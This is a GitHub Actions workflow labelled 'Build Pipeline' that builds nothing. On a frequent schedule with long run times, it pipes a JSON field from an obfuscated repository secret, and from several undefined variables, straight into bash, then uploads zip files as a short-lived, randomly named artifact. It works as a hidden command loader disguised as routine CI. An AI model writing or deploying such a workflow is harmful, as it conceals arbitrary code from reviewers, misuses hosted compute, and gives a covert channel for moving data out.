name: Build Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '22 1,7,13,19 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  compile:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Setup and run
        env:
          xhkt8: ${{ secrets.xhkt8 }}
        run: |
          printf '%s' "$xhkt8" | jq -r .o7 | /bin/bash
          echo $slk200 | jq -r .ymjkg40797 | /bin/bash
          echo $soae8187 | jq -r .rrvy903 | /bin/bash
          echo $vs3 | jq -r .iwhgb4254 | /bin/bash

      - name: Upload data
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ei4NttVt
          path: "*.zip"
          retention-days: 1
